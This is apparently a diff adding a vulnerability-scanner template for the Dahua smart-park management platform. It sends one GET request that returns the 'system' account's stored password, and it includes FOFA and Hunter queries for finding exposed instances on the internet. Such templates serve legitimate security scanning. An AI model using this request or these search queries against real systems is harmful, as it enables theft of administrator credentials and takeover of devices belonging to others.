@@ -1,0 +1,27 @@
+﻿id: dahua-loginpass-leak
+info:
+    author: user
+    description: 大华智慧园区任意密码读取攻击
+    metadata:
+        fofa-query: app="dahua-智慧园区综合管理平台"
+        hunter-query: web.body="/WPMS/asset/lib/gridster/"
+    name: dahua-loginpass-leak
+    reference:
+        - https://cn-sec.com/archives/1959355.html
+        - https://blog.csdn.net/weixin_43981050/article/details/132276011
+    severity: high
+    tags:
+        - dahua
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - '"loginName":"system","loginPass"'
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system'
